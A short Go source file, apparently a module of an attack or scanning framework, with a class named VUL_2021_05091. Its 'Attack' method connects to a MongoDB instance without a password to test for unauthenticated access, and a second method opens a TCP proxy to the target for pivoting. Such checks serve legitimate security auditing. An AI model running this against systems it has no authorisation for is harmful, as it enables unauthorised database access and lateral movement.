package payload

import (
	"context"

	"github.com/jstang9527/gofor/src/share/proxy"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

type VUL_2021_05091 struct {
	target string // "127.0.0.1:27017"
}

func NewVUL_2021_05091(target string) *VUL_2021_05091 {
	return &VUL_2021_05091{target: target}
}

// Attack 无密码连接
func (r *VUL_2021_05091) Attack() (string, error) {
	opt := options.Client().ApplyURI("mongodb://" + r.target)
	// 连接到MongoDB
	client, err := mongo.Connect(context.TODO(), opt)
	if err != nil {
		return "", err
	}

	// 检查连接
	err = client.Ping(context.TODO(), nil)
	return "", err
}

// CreateProxy ...
func (r *VUL_2021_05091) CreateProxy() (string, error) {
	return proxy.NewProxy(proxy.ProxyTypeTCP, r.target).Run()
}
